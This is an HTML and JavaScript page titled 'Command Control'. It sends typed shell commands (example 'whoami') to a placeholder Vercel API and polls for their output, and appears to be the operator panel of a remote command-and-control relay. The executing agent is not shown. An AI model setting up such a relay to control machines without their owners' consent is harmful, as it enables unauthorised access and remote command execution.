<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Command Panel</title>
  <style>
    body { font-family: monospace; padding: 20px; background: #111; color: #0f0; }
    input, button { padding: 10px; margin: 5px; }
    pre { background: #000; padding: 10px; overflow: auto; }
  </style>
</head>
<body>
  <h1>Command Control</h1>
  
  <input type="text" id="cmd" placeholder="Enter command (e.g. whoami)" style="width: 400px;">
  <button onclick="sendCommand()">Send Command</button>
  
  <h2>Output:</h2>
  <pre id="output">Waiting for output...</pre>

  <script>
    let lastId = 0;
    const apiUrl = 'https://your-project.vercel.app/api/command'; // ← CHANGE THIS

    async function sendCommand() {
      const cmd = document.getElementById('cmd').value;
      if (!cmd) return;

      const id = Date.now();
      await fetch(apiUrl, {
        method: 'POST',
        headers: {'Content-Type': 'application/json'},
        body: JSON.stringify({ command: cmd, id: id })
      });
      document.getElementById('cmd').value = '';
    }

    async function poll() {
      try {
        const res = await fetch(`${apiUrl}?latestId=${lastId}`);
        const data = await res.json();

        if (data.commands && data.commands.length > 0) {
          data.commands.forEach(c => {
            console.log(`New command: ${c.command}`);
          });
        }

        if (data.outputs) {
          const outDiv = document.getElementById('output');
          Object.keys(data.outputs).forEach(id => {
            outDiv.textContent = data.outputs[id];
            lastId = Math.max(lastId, parseInt(id));
          });
        }
      } catch(e) {}
    }

    setInterval(poll, 2000); // Check every 2 seconds
    poll();
  </script>
</body>
</html>
